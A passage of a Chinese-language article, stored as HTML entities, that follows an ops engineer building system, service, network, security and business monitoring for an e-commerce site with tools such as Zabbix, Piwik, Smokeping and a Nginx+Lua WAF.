&#x8FD9;&#x4E5F;&#x662F;&#x6211;&#x4EEC;CPU&#x76D1;&#x63A7;&#x7684;&#x4E09;&#x4E2A;&#x91CD;&#x70B9;&#x3002;&#x901A;&#x5E38;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x6BCF;&#x4E2A;&#x5904;&#x7406;&#x5668;&#x7684;&#x8FD0;&#x884C;&#x961F;&#x5217;&#x8981;&#x5C0F;&#x4E8E;&#x7B49;&#x4E8E;3&#xFF0C;CPU &#x5229;&#x7528;&#x7387;&#x4E2D;user/system&#x6BD4;&#x4F8B;&#x7EF4;&#x6301;&#x5728;70/30&#xFF0C;&#x4E0A;&#x4E0B;&#x6587;&#x5207;&#x6362;&#x8981;&#x6839;&#x636E;&#x7CFB;&#x7EDF;&#x7E41;&#x5FD9;&#x7A0B;&#x5EA6;&#x6765;&#x7EFC;&#x5408;&#x8003;&#x91CF;&#x3002; &#x5E38;&#x7528;&#x7684;&#x76D1;&#x63A7;&#x5DE5;&#x5177;&#x6709;&#xFF1A;top vmstat mpstat &#x5185;&#x5B58;&#xFF1A;Linux&#x865A;&#x62DF;&#x5185;&#x5B58;&#x662F;&#x4E00;&#x4E2A;&#x5E9E;&#x5927;&#x7684;&#x4E1C;&#x4E1C;&#xFF0C;&#x901A;&#x5E38;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x76D1;&#x63A7;&#x5185;&#x5B58;&#x7684;&#x4F7F;&#x7528;&#x7387;&#x3001;SWAP&#x4F7F;&#x7528;&#x7387;&#x3001;&#x540C;&#x65F6;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5185;&#x5B58;&#x7684;&#x4F7F;&#x7528;&#x7387;&#x66F2;&#x7EBF;&#x6765;&#x53D1;&#x73B0;&#x67D0;&#x4E9B;&#x670D;&#x52A1;&#x7684;&#x5185;&#x5B58;&#x6EA2;&#x51FA;&#x7B49;&#x3002; &#x76D1;&#x63A7;&#x5DE5;&#x5177;&#x6709;&#xFF1A;free vmstat IO&#xFF1A;IO&#x5206;&#x4E3A;&#x78C1;&#x76D8;IO&#x548C;&#x7F51;&#x7EDC;IO&#x3002;&#x9664;&#x4E86;&#x5728;&#x505A;&#x6027;&#x80FD;&#x8C03;&#x4F18;&#x6211;&#x4EEC;&#x8981;&#x76D1;&#x63A7;&#x66F4;&#x8BE6;&#x7EC6;&#x7684;&#x6570;&#x636E;&#x5916;&#xFF0C;&#x90A3;&#x4E48;&#x65E5;&#x5E38;&#x76D1;&#x63A7;&#xFF0C;&#x53EA;&#x5173;&#x6CE8;&#x78C1;&#x76D8;&#x4F7F;&#x7528;&#x7387;&#x3001;io wait&#x5373;&#x53EF;&#xFF0C;&#x7F51;&#x7EDC;&#x4E5F;&#x662F;&#x76D1;&#x63A7;&#x7F51;&#x5361;&#x6D41;&#x91CF;&#x5373;&#x53EF;&#x3002;&#x5DE5;&#x5177;&#x6709;iostat iotop iftop&#x3002; TCP&#x76D1;&#x63A7;&#xFF1A;&#x5728;&#x5F88;&#x591A;&#x60C5;&#x51B5;&#x4E0B;&#x6709;&#x5FC5;&#x8981;&#x76D1;&#x63A7;TCP&#x7684;&#x72B6;&#x6001;&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;netstat&#x6216;&#x8005;ss&#x6765;&#x83B7;&#x53D6;&#x6240;&#x6709;&#x7684;TCP&#x8FDE;&#x63A5;&#xFF0C;&#x6765;&#x5C55;&#x73B0;11&#x79CD;&#x4E0D;&#x540C;&#x7684;TCP&#x8FDE;&#x63A5;&#x72B6;&#x6001;&#x7684;&#x6570;&#x91CF;&#xFF0C;&#x53EF;&#x4EE5;&#x5728;&#x5927;&#x5E76;&#x53D1;&#x4E2D;&#x53CA;&#x65F6;&#x53D1;&#x73B0;TCP&#x7684;&#x76F8;&#x5173;&#x6545;&#x969C;&#x3002; &#x5176;&#x5B83;&#x7684;&#x7CFB;&#x7EDF;&#x76D1;&#x63A7;&#x8FD8;&#x6709;&#x8FD0;&#x884C;&#x7684;&#x8FDB;&#x7A0B;&#x6570;&#x3001;&#x767B;&#x9646;&#x7528;&#x6237;&#x3001;Open File&#x7B49;&#x3002; 2.3 &#x5E94;&#x7528;&#x670D;&#x52A1;&#x76D1;&#x63A7;&#x5C0F;&#x738B;&#x628A;&#x786C;&#x4EF6;&#x76D1;&#x63A7;&#x548C;&#x7CFB;&#x7EDF;&#x76D1;&#x63A7;&#x7814;&#x7A76;&#x660E;&#x767D;&#x540E;&#xFF0C;&#x767B;&#x9646;&#x5230;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x7EE7;&#x7EED;&#x7814;&#x7A76;&#xFF0C;&#x5076;&#x7136;&#x95F4;&#x4E00;&#x4E2A;ps aux&#xFF0C;&#x5C0F;&#x738B;&#x53D1;&#x73B0;&#xFF0C;&#x6211;&#x4EEC;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x8FD0;&#x884C;&#x4E86;&#x8FD9;&#x4E48;&#x591A;&#x7684;&#x670D;&#x52A1;&#xFF0C;&#x90A3;&#x90FD;&#x9700;&#x8981;&#x76D1;&#x63A7;&#x8D77;&#x6765;&#x554A;&#x3002; &#x5E94;&#x7528;&#x670D;&#x52A1;&#x76D1;&#x63A7;&#x4E5F;&#x662F;&#x76D1;&#x63A7;&#x4F53;&#x7CFB;&#x4E2D;&#x6BD4;&#x8F83;&#x91CD;&#x8981;&#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A; Apache&#xFF1A;Apache&#x63D0;&#x4F9B;&#x4E86;mod_status&#x548C;mod_info&#x6A21;&#x5757;&#x7528;&#x6765;&#x8F93;&#x51FA;Apache&#x7684;&#x72B6;&#x6001;&#xFF0C;&#x5C0F;&#x738B;&#x5199;&#x4E86;&#x4E00;&#x4E2A;&#x811A;&#x672C;&#xFF0C;&#x5404;&#x79CD;grep&#x548C;awk&#x641E;&#x5B9A;&#x3002;Nginx&#xFF1A;&#x540C;&#x6837;&#x6709;&#x72B6;&#x6001;&#x6A21;&#x5757;&#xFF0C;&#x7F16;&#x8BD1;&#x7684;&#x65F6;&#x5019;&#x52A0;&#x4E0A;&#x2014;with-http_stub_status_module&#xFF0C;&#x7136;&#x540E;&#x5C31;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;stub_status on&#x6765;&#x5F00;&#x542F;&#x4E86;&#x3002;Memcached&#xFF1A;&#x5C0F;&#x738B;&#x4F7F;&#x7528;nc&#x7ED9;memcached&#x53D1;&#x9001;&#x4E86;&#x4E00;&#x4E2A;stats&#x547D;&#x4EE4;&#x5C31;&#x83B7;&#x53D6;&#x5230;&#x4E86;&#x6240;&#x6709;&#x60F3;&#x8981;&#x7684;&#x4FE1;&#x606F;&#x3002;Redis&#xFF1A;&#x5C0F;&#x738B;&#x8FD8;&#x662F;&#x4F7F;&#x7528;nc&#x7ED9;redis&#x53D1;&#x9001;&#x4E86;&#x4E00;&#x4E2A;info&#x547D;&#x4EE4;&#x5C31;&#x83B7;&#x53D6;&#x5230;&#x4E86;redis&#x7684;&#x76F8;&#x5173;&#x72B6;&#x6001;&#x3002;JVM&#xFF1A;&#x4F7F;&#x7528;jmconsole&#xFF0C;&#x6216;&#x8005;jmx&#x5C31;&#x53EF;&#x4EE5;&#x8FDB;&#x884C;&#x8FDC;&#x7A0B;&#x76D1;&#x63A7;&#x3002;&#x4E8E;&#x662F;&#x5C0F;&#x738B;&#xFF0C;&#x5C06;&#x7EBF;&#x4E0A;&#x7684;&#x5404;&#x79CD;&#x670D;&#x52A1;&#xFF0C;&#x90FD;&#x4E00;&#x4E2A;&#x4E00;&#x4E2A;&#x7684;&#x8FDB;&#x884C;&#x4E86;&#x76D1;&#x63A7;&#xFF0C;&#x8FD9;&#x6837;&#x8FD9;&#x4E9B;&#x670D;&#x52A1;&#x7684;&#x8BE6;&#x7EC6;&#x7684;&#x8FD0;&#x884C;&#x72B6;&#x6001;&#x5C31;&#x4E86;&#x5982;&#x6307;&#x638C;&#x4E86;&#x3002; &#x540C;&#x65F6;&#xFF0C;&#x8FD8;&#x9700;&#x8981;&#x5C06;&#x6240;&#x6709;&#x7684;API&#x63A5;&#x53E3;&#x72B6;&#x6001;&#x8FDB;&#x884C;&#x76D1;&#x63A7;&#xFF0C;&#x6BD4;&#x5982;&#x901A;&#x8FC7;curl&#x68C0;&#x67E5;&#x8FD4;&#x56DE;&#x7684;HTTP&#x72B6;&#x6001;&#x7801;&#x3002;&#x6709;&#x6761;&#x4EF6;&#x7684;&#x7528;&#x6237;&#xFF0C;&#x53EF;&#x4EE5;&#x505A;&#x4E00;&#x4E2A;URL&#x76D1;&#x63A7;&#x5E73;&#x53F0;&#xFF0C;&#x4E13;&#x95E8;&#x7528;&#x6765;&#x505A;&#x8FD9;&#x4E2A;&#x4E8B;&#x60C5;&#x3002; 2.4 &#x5F15;&#x5165;Zabbix&#x81EA;&#x4ECE;&#x5C0F;&#x738B;&#x63A5;&#x6536;&#x5230;&#x76D1;&#x63A7;&#x7684;&#x4EFB;&#x52A1;&#x540E;&#xFF0C;&#x8FD9;Shell&#x7F16;&#x7A0B;&#x80FD;&#x529B;&#x662F;&#x8D8A;&#x6765;&#x8D8A;&#x5F3A;&#x4E86;&#xFF0C;&#x4F46;&#x662F;&#x6BCF;&#x5929;&#x4E00;&#x6253;&#x5F00;&#x90AE;&#x7BB1;&#x5C31;&#x88AB;&#x5404;&#x79CD;&#x62A5;&#x8B66;&#x6240;&#x6DF9;&#x6CA1;&#xFF0C;&#x811A;&#x672C;&#x591A;&#x800C;&#x6742;&#x4E71;&#x3002; &#x5C0F;&#x738B;&#x60F3;&#xFF0C;&#x6211;&#x9700;&#x8981;&#x4E00;&#x4E2A;&#x4EC0;&#x4E48;&#x76D1;&#x63A7;&#x5DE5;&#x5177;&#x6765;&#x5E72;&#x8FD9;&#x4E9B;&#x4E8B;&#xFF0C;&#x4E0D;&#x80FD;&#x8FD9;&#x4E48;&#x5199;&#x811A;&#x672C;&#x4E0B;&#x53BB;&#x4E86;&#x3002;&#x4E8E;&#x662F;&#x5728;&#x7F51;&#x4E0A;&#x8FDB;&#x884C;&#x5404;&#x79CD;&#x641C;&#x7D22;&#xFF0C;&#x53D1;&#x73B0;&#x4E86;&#x5F88;&#x591A;&#x7684;&#x76D1;&#x63A7;&#x5DE5;&#x5177;&#x5982;Nagios&#x3001;Cacti&#x3001;Zabbix&#xFF0C;&#x539F;&#x6765;&#x81EA;&#x5DF1;&#x4E4B;&#x524D;&#x8D39;&#x90A3;&#x4E48;&#x5927;&#x52B2;&#xFF0C;&#x8FD9;&#x4E9B;&#x5DE5;&#x5177;&#x65E9;&#x5C31;&#x5B9E;&#x73B0;&#x4E86;&#x3002; &#x7ECF;&#x8FC7;&#x76F8;&#x5173;&#x7684;&#x5BF9;&#x6BD4;&#xFF0C;&#x5C0F;&#x738B;&#x9009;&#x62E9;&#x4E86;Zabbix&#x3002;&#x7136;&#x540E;&#x4E4B;&#x524D;&#x7684;&#x6240;&#x6709;&#x76D1;&#x63A7;&#x8303;&#x7574;&#xFF0C;&#x90FD;&#x53EF;&#x4EE5;&#x6574;&#x5408;&#x5230;Zabbix&#x4E2D;&#x3002; &#x786C;&#x4EF6;&#x76D1;&#x63A7;&#xFF1A;Zabbix IPMI Interface&#x7CFB;&#x7EDF;&#x76D1;&#x63A7;&#xFF1A;Zabbix Agent InterfaceJava&#x76D1;&#x63A7;&#xFF1A;Zabbix JMX Interface&#x7F51;&#x7EDC;&#x8BBE;&#x5907;&#x76D1;&#x63A7;&#xFF1A;Zabbix SNMP Interface&#x5E94;&#x7528;&#x670D;&#x52A1;&#x76D1;&#x63A7;&#xFF1A;Zabbix Agent UserParameterMySQL&#x6570;&#x636E;&#x5E93;&#x76D1;&#x63A7;&#xFF1A;percona-monitoring-plulginsURL&#x76D1;&#x63A7;&#xFF1A;Zabbix Web &#x76D1;&#x63A7; &#x8FD9;&#x4E00;&#x4E0B;&#x5B50;&#x628A;&#x4E4B;&#x524D;&#x5E72;&#x7684;&#x5DE5;&#x4F5C;&#x5168;&#x96C6;&#x6210;&#x5230;&#x4E00;&#x4E2A;&#x5E73;&#x53F0;&#x4E0A;&#x4E86;&#x3002;&#x800C;&#x4E14;&#x4E4B;&#x524D;&#x7F16;&#x5199;&#x7684;&#x6240;&#x6709;&#x7684;&#x5E94;&#x7528;&#x670D;&#x52A1;&#x7684;&#x76D1;&#x63A7;&#x811A;&#x672C;&#xFF0C;&#x7B80;&#x5355;&#x4FEE;&#x6539;&#x5C31;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x3002; &#x540C;&#x65F6;&#x4E5F;&#x53EF;&#x4EE5;&#x7075;&#x6D3B;&#x7684;&#x8BBE;&#x7F6E;&#x62A5;&#x8B66;&#x9608;&#x503C;&#x3001;&#x544A;&#x8B66;&#x65B9;&#x5F0F;&#x3001;&#x544A;&#x8B66;&#x5347;&#x7EA7;&#x3001;&#x544A;&#x8B66;&#x53BB;&#x91CD;&#x3001;&#x544A;&#x8B66;&#x4F9D;&#x8D56;&#x7B49;&#x7B49;&#xFF0C;&#x540C;&#x65F6;&#x8FD8;&#x4F7F;&#x7528;Zabbix&#x7684;&#x81EA;&#x52A8;&#x53D1;&#x73B0;&#x529F;&#x80FD;&#x5B9E;&#x73B0;&#x4E0A;&#x7EBF;&#x4E00;&#x53F0;&#x670D;&#x52A1;&#x5668;&#x540E;&#xFF0C;&#x81EA;&#x52A8;&#x6DFB;&#x52A0;&#x76D1;&#x63A7;&#x3002; &#x4F7F;&#x7528;Zabbix Proxy&#x5B9E;&#x73B0;&#x4E86;&#x591A;&#x673A;&#x623F;&#x7684;&#x5206;&#x5E03;&#x5F0F;&#x76D1;&#x63A7;&#xFF0C;&#x8FD9;&#x7B80;&#x76F4;&#x592A;&#x68D2;&#x4E86;&#x3002; &#x5BF9;&#x4E8E;&#x544A;&#x8B66;&#x901A;&#x77E5;&#xFF1A;&#x90AE;&#x4EF6;&#x3001;&#x5FAE;&#x4FE1;&#x3001;&#x77ED;&#x4FE1;&#x3001;&#x9489;&#x9489;&#x7B49;&#xFF0C;&#x90FD;&#x53EF;&#x4EE5;&#x4E0E;Zabbix&#x5FEB;&#x901F;&#x7684;&#x96C6;&#x6210;&#xFF0C;&#x7F51;&#x4E0A;&#x6709;&#x5F88;&#x591A;&#x6B64;&#x7C7B;&#x6587;&#x6863;&#x3002; &#x540C;&#x65F6;&#xFF0C;&#x9488;&#x5BF9;&#x67D0;&#x4E9B;&#x53EF;&#x4EE5;&#x8FDB;&#x884C;&#x76F4;&#x63A5;&#x5904;&#x7406;&#x7684;&#x62A5;&#x8B66;&#xFF0C;Zabbix&#x53EF;&#x4EE5;&#x89E6;&#x53D1;Action&#x6765;&#x8F7B;&#x677E;&#x5E2E;&#x4F60;&#x5B9E;&#x73B0;&#xFF0C;&#x6545;&#x969C;&#x7684;&#x81EA;&#x52A8;&#x5904;&#x7406;&#x3002; &#x4E8E;&#x662F;&#x5C0F;&#x738B;&#x51C6;&#x5907;&#x5411;&#x7ECF;&#x7406;&#x6C47;&#x62A5;&#x5DE5;&#x4F5C;&#xFF0C;&#x6B64;&#x5904;&#x7701;&#x7565;300&#x5B57;&#xFF0C;&#x4F46;&#x662F;&#x4E0D;&#x5230;10&#x5206;&#x949F;&#x5C0F;&#x738B;&#x5782;&#x76F4;&#x5934;&#x56DE;&#x6765;&#x4E86;&#x3002;&#x56E0;&#x4E3A;&#x7ECF;&#x7406;&#x95EE;&#x4E86;&#x4E00;&#x4E2A;&#x95EE;&#x9898;&#xFF0C;&#x5C0F;&#x738B;&#x56DE;&#x7B54;&#x4E0D;&#x4E0A;&#x6765;&#xFF1A;&#x5C0F;&#x738B;&#xFF0C;&#x4ECA;&#x5929;&#x54B1;&#x4EEC;&#x7F51;&#x7AD9;&#x7684;&#x6574;&#x4F53;PV&#x662F;&#x591A;&#x5C11;&#xFF1F;&#x73B0;&#x5728;&#x8BBF;&#x95EE;&#x6700;&#x591A;&#x7684;&#x9875;&#x9762;&#x662F;&#x54EA;&#x4E2A;&#xFF1F; 2.5 &#x6D41;&#x91CF;&#x5206;&#x6790;&#x5C0F;&#x738B;&#x9996;&#x5148;&#x60F3;&#x5230;&#x7684;&#x662F;&#x628A;&#x8BBF;&#x95EE;&#x65E5;&#x5FD7;&#x62FF;&#x51FA;&#x6765;&#x5404;&#x79CD;awk&#x7136;&#x540E;sort&#x4E00;&#x4E0B;&#xFF0C;&#x4F46;&#x662F;&#x8FD9;&#x6B21;&#x4ED6;&#x6CA1;&#x6709;&#x6025;&#x4E8E;&#x5F00;&#x59CB;&#xFF0C;&#x96BE;&#x9053;&#x5C31;&#x6CA1;&#x6709;&#x505A;&#x8FD9;&#x4E9B;&#x7EDF;&#x8BA1;&#x548C;&#x5206;&#x6790;&#x7684;&#x5DE5;&#x5177;&#x5417;&#xFF1F; &#x4E8E;&#x662F;&#x5C0F;&#x738B;&#x53D1;&#x73B0;&#x4E86;google&#x5206;&#x6790;&#x3001;&#x767E;&#x5EA6;&#x7EDF;&#x8BA1;&#x3001;&#x7AD9;&#x957F;&#x5DE5;&#x5177;&#x7B49;&#x7B49;&#x4E00;&#x5806;&#x7EDF;&#x8BA1;&#x7684;&#x4E1C;&#x897F;&#xFF0C;&#x53EA;&#x9700;&#x8981;&#x5728;&#x9875;&#x9762;&#x5D4C;&#x5165;&#x4E00;&#x4E2A;js&#x5373;&#x53EF;&#x3002; &#x4F46;&#x662F;&#x5462;&#xFF1F;&#x8FD9;&#x4E2A;&#x6570;&#x636E;&#x59CB;&#x7EC8;&#x662F;&#x5728;&#x5BF9;&#x65B9;&#x90A3;&#x91CC;&#xFF0C;&#x800C;&#x4E14;&#x529F;&#x80FD;&#x5B9A;&#x5236;&#x8D77;&#x6765;&#x4E5F;&#x4E0D;&#x65B9;&#x4FBF;&#xFF0C;&#x4E8E;&#x662F;google&#x5E2E;&#x52A9;&#x4E86;&#x4ED6;&#xFF0C;&#x4E00;&#x4E2A;&#x53EB;&#x505A;piwik&#x7684;&#x5F00;&#x6E90;&#x9879;&#x76EE;&#x6620;&#x5165;&#x773C;&#x5E18;&#x3002; &#x7F51;&#x7AD9;&#x6D41;&#x91CF;&#x5206;&#x6790;&#x5BF9;&#x4E8E;&#x8FD0;&#x7EF4;&#x4EBA;&#x5458;&#x6765;&#x8BF4;&#xFF0C;&#x66F4;&#x662F;&#x4E00;&#x95E8;&#x5FC5;&#x987B;&#x638C;&#x63E1;&#x7684;&#x77E5;&#x8BC6;&#x4E86;&#x3002;&#x6BD4;&#x5982;&#x5BF9;&#x4E8E;&#x4E00;&#x5BB6;&#x7535;&#x5546;&#x516C;&#x53F8;&#x6765;&#x8BF4;&#xFF0C;&#x901A;&#x8FC7;&#x5BF9;&#x8BA2;&#x5355;&#x6765;&#x6E90;&#x7684;&#x7EDF;&#x8BA1;&#x548C;&#x5206;&#x6790;&#xFF0C;&#x53EF;&#x4EE5;&#x4E86;&#x89E3;&#x6211;&#x4EEC;&#x5728;&#x67D0;&#x4E2A;&#x7F51;&#x7AD9;&#x4E0A;&#x7684;&#x5E7F;&#x544A;&#x6295;&#x5165;&#x6709;&#x6CA1;&#x6709;&#x6536;&#x5230;&#x9884;&#x671F;&#x7684;&#x6548;&#x679C;&#x3002;&#x53EF;&#x4EE5;&#x533A;&#x5206;&#x4E0D;&#x540C;&#x5730;&#x533A;&#x7684;&#x8BBF;&#x95EE;&#x4EBA;&#x6570;&#x3001;&#x751A;&#x81F3;&#x5546;&#x54C1;&#x4EA4;&#x6613;&#x989D;&#x7B49;&#x3002; &#x800C;&#x4E14;&#xFF0C;&#x6D41;&#x91CF;&#x5206;&#x6790;&#x662F;&#x8FD0;&#x7EF4;&#x5411;&#x8FD0;&#x8425;&#x62D3;&#x5C55;&#x7684;&#x5FC5;&#x7ECF;&#x4E4B;&#x8DEF;&#xFF0C;&#x4F5C;&#x4E3A;&#x4E00;&#x540D;&#x8FD0;&#x7EF4;&#x5DE5;&#x7A0B;&#x5E08;&#x5F88;&#x6709;&#x5FC5;&#x8981;&#x638C;&#x63E1;&#x516C;&#x53F8;&#x7AD9;&#x70B9;&#x7684;&#x5404;&#x79CD;&#x8BBF;&#x95EE;&#x8BE6;&#x60C5;&#x3002; 2.6 &#x7F51;&#x7EDC;&#x76D1;&#x63A7;&#x4F5C;&#x4E3A;&#x4E00;&#x4E2A;&#x9488;&#x5BF9;&#x5168;&#x56FD;&#x7528;&#x6237;&#x7684;&#x7535;&#x5546;&#x7F51;&#x7AD9;&#xFF0C;&#x65F6;&#x523B;&#x638C;&#x63E1;&#x5404;&#x5730;&#x5230;&#x673A;&#x623F;&#x7684;&#x7F51;&#x7EDC;&#x72B6;&#x6001;&#x662F;&#x5C0F;&#x738B;&#x7684;&#x4E0B;&#x4E00;&#x4E2A;&#x76D1;&#x63A7;&#x76EE;&#x6807;&#x3002; &#x7F51;&#x7EDC;&#x76D1;&#x63A7;&#x662F;&#x6211;&#x4EEC;&#x6784;&#x5EFA;&#x76D1;&#x63A7;&#x5E73;&#x53F0;&#x662F;&#x5FC5;&#x987B;&#x8981;&#x8003;&#x8651;&#x7684;&#xFF0C;&#x5C24;&#x5176;&#x662F;&#x9488;&#x5BF9;&#x6709;&#x591A;&#x4E2A;&#x673A;&#x623F;&#x7684;&#x573A;&#x666F;&#xFF0C;&#x5404;&#x4E2A;&#x673A;&#x623F;&#x4E4B;&#x95F4;&#x7684;&#x7F51;&#x7EDC;&#x72B6;&#x6001;&#xFF0C;&#x673A;&#x623F;&#x548C;&#x5168;&#x56FD;&#x5404;&#x5730;&#x7684;&#x7F51;&#x7EDC;&#x72B6;&#x6001;&#x90FD;&#x662F;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x91CD;&#x70B9;&#x5173;&#x6CE8;&#x7684;&#x5BF9;&#x8C61;&#xFF0C;&#x90A3;&#x4E48;&#x5982;&#x4F55;&#x638C;&#x63E1;&#x8FD9;&#x4E9B;&#x72B6;&#x6001;&#x4FE1;&#x606F;&#x5462;&#xFF1F;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x501F;&#x52A9;&#x4E8E;&#x7F51;&#x7EDC;&#x76D1;&#x63A7;&#x5DE5;&#x5177;Smokeping&#x3002; Smokeping &#x662F;rrdtool&#x7684;&#x4F5C;&#x8005;Tobi Oetiker&#x7684;&#x4F5C;&#x54C1;&#xFF0C;&#x662F;&#x7528;Perl&#x5199;&#x7684;&#xFF0C;&#x4E3B;&#x8981;&#x662F;&#x76D1;&#x89C6;&#x7F51;&#x7EDC;&#x6027;&#x80FD;&#xFF0C;www &#x670D;&#x52A1;&#x5668;&#x6027;&#x80FD;&#xFF0C;dns&#x67E5;&#x8BE2;&#x6027;&#x80FD;&#x7B49;&#xFF0C;&#x4F7F;&#x7528;rrdtool&#x7ED8;&#x56FE;&#xFF0C;&#x800C;&#x4E14;&#x652F;&#x6301;&#x5206;&#x5E03;&#x5F0F;&#xFF0C;&#x76F4;&#x63A5;&#x4ECE;&#x591A;&#x4E2A;agent&#x8FDB;&#x884C;&#x6570;&#x636E;&#x7684;&#x6C47;&#x603B;&#x3002; &#x540C;&#x65F6;&#xFF0C;&#x7531;&#x4E8E;&#x81EA;&#x5DF1;&#x76D1;&#x63A7;&#x70B9;&#x6BD4;&#x8F83;&#x5C11;&#xFF0C;&#x8FD8;&#x53EF;&#x4EE5;&#x501F;&#x52A9;&#x5F88;&#x591A;&#x5546;&#x4E1A;&#x7684;&#x76D1;&#x63A7;&#x5DE5;&#x5177;&#xFF0C;&#x6BD4;&#x5982;&#x76D1;&#x63A7;&#x5B9D;&#x3001;&#x57FA;&#x8C03;&#x3001;&#x535A;&#x745E;&#x7B49;&#x3002;&#x540C;&#x65F6;&#x8FD9;&#x4E9B;&#x670D;&#x52A1;&#x63D0;&#x4F9B;&#x5546;&#x8FD8;&#x53EF;&#x4EE5;&#x5E2E;&#x52A9;&#x4F60;&#x76D1;&#x63A7;CDN&#x7684;&#x72B6;&#x6001;&#x3002; 2.7 &#x5B89;&#x5168;&#x76D1;&#x63A7;&#x867D;&#x7136;iptables&#x5E2E;&#x52A9;&#x5C0F;&#x738B;&#x5B8C;&#x6210;&#x4E86;&#x56DB;&#x5C42;&#x7684;&#x5B89;&#x5168;&#x9632;&#x62A4;&#xFF0C;&#x4F46;&#x662F;&#x9488;&#x5BF9;&#x4E03;&#x5C42;&#x7684;Web&#x5C42;&#x9762;&#x600E;&#x4E48;&#x529E;&#x5462;&#xFF1F; &#x4E8E;&#x662F;&#x5C0F;&#x738B;&#x4F7F;&#x7528;Nginx + Lua&#x7F16;&#x5199;&#x4E86;&#x4E00;&#x4E2A;WAF&#xFF0C;&#x7136;&#x540E;&#x628A;&#x76F8;&#x5173;&#x7684;&#x65E5;&#x5FD7;&#x8BB0;&#x5F55;&#x5230;&#x4E86;Elasticsearch&#x4E2D;&#xFF0C;&#x901A;&#x8FC7;kibana&#x53EF;&#x4EE5;&#x56FE;&#x5F62;&#x5316;&#x7684;&#x5C55;&#x793A;&#x4E0D;&#x540C;&#x7684;&#x653B;&#x51FB;&#x7C7B;&#x578B;&#x7684;&#x7EDF;&#x8BA1;&#x3002; &#x540C;&#x65F6;&#x5C0F;&#x738B;&#x5B66;&#x4E60;&#x4F7F;&#x7528;python&#x8FD8;&#x5199;&#x4E86;&#x4E00;&#x4E2A;&#x722C;&#x866B;&#x5B9A;&#x671F;&#x626B;&#x63CF;github&#xFF0C;&#x6709;&#x6CA1;&#x6709;&#x516C;&#x53F8;&#x76F8;&#x5173;&#x7684;&#x5173;&#x952E;&#x5B57;&#xFF0C;&#x4EE5;&#x514D;&#x540C;&#x4E8B;&#x5206;&#x4EAB;&#x4EE3;&#x7801;&#x65F6;&#xFF0C;&#x4E0D;&#x5C0F;&#x5FC3;&#x6D89;&#x53CA;&#x5230;&#x654F;&#x611F;&#x7684;&#x5185;&#x5BB9;&#x3002; &#xFF08;&#x56FE;&#x7247;&#x6765;&#x6E90;https://github.com/loveshell/ngx_lua_waf&#xFF09; 2.8 &#x4E1A;&#x52A1;&#x76D1;&#x63A7;&#x5C0F;&#x738B;&#x518D;&#x53BB;&#x5411;&#x7ECF;&#x7406;&#x6C47;&#x62A5;&#xFF0C;&#x521A;&#x8D70;&#x5230;&#x95E8;&#x53E3;&#x88AB;&#x603B;&#x7ECF;&#x7406;&#x78B0;&#x4E0A;&#x4E86;&#xFF0C;&#x5F20;&#x603B;&#x8BF4;&#xFF1A;&#x5C0F;&#x738B;&#x554A;&#xFF0C;&#x4F60;&#x4EEC;&#x7ECF;&#x7406;&#x6C47;&#x62A5;&#x4F60;&#x6700;&#x8FD1;&#x76D1;&#x63A7;&#x5DE5;&#x4F5C;&#x5E72;&#x7684;&#x4E0D;&#x9519;&#xFF0C;&#x4F60;&#x7ED9;&#x6211;&#x8BF4;&#x4E0B;&#xFF0C;&#x54B1;&#x4EEC;&#x73B0;&#x5728;10&#x70B9;&#x7684;&#x65F6;&#x5019;&#x603B;&#x8BA2;&#x5355;&#x662F;&#x591A;&#x5C11;&#xFF0C;&#x6BCF;&#x5206;&#x949F;&#x5E73;&#x5747;&#x8BA2;&#x5355;&#x6709;&#x591A;&#x5C11;&#xFF1F; &#x5C0F;&#x738B;&#x53C8;&#x8499;&#x4E86;&#xFF0C;&#x6211;&#x81EA;&#x5DF1;&#x4E5F;&#x66FE;&#x7ECF;&#x5C31;&#x662F;&#x90A3;&#x4E2A;&#x5C0F;&#x738B;&#xFF01; &#x6CA1;&#x6709;&#x4E1A;&#x52A1;&#x6307;&#x6807;&#x76D1;&#x63A7;&#x7684;&#x76D1;&#x63A7;&#x5E73;&#x53F0;&#x662F;&#x4E00;&#x4E2A;&#x4E0D;&#x5B8C;&#x5584;&#x7684;&#x76D1;&#x63A7;&#x5E73;&#x53F0;&#xFF0C;&#x901A;&#x5E38;&#x5728;&#x6211;&#x4EEC;&#x505A;&#x76D1;&#x63A7;&#x7CFB;&#x7EDF;&#x4E2D;&#xFF0C;&#x5FC5;&#x987B;&#x5C06;&#x6211;&#x4EEC;&#x91CD;&#x8981;&#x7684;&#x4E1A;&#x52A1;&#x6307;&#x6807;&#x8FDB;&#x884C;&#x76D1;&#x63A7;&#xFF0C;&#x5E76;&#x8BBE;&#x7F6E;&#x9608;&#x503C;&#x8FDB;&#x884C;&#x544A;&#x8B66;&#x901A;&#x77E5;&#x3002; &#x6BD4;&#x5982;&#x6BCF;&#x5206;&#x949F;&#x7684;&#x8BA2;&#x5355;&#x3001;&#x6BCF;&#x5206;&#x949F;&#x6CE8;&#x518C;&#x3001;&#x65E5;&#x6D3B;&#x7528;&#x6237;&#x3001;&#x77ED;&#x4FE1;&#x4F7F;&#x7528;&#x91CF;&#x7B49;&#x91CD;&#x8981;&#x7684;&#x4E1A;&#x52A1;&#x6307;&#x6807;&#x90FD;&#x53EF;&#x4EE5;&#x52A0;&#x5165;&#x5230;Zabbix&#x4E0A;&#x3002; &#x6CE8;&#xFF1A;&#x7531;&#x4E8E;&#x4E1A;&#x52A1;&#x76D1;&#x63A7;&#x56FE;&#x8868;&#xFF0C;&#x6D89;&#x53CA;&#x5230;&#x9690;&#x79C1;&#x7684;&#x6570;&#x636E;&#x592A;&#x591A;&#xFF0C;&#x5C31;&#x4E0D;&#x622A;&#x56FE;&#x4E86;&#x3002; 2.9 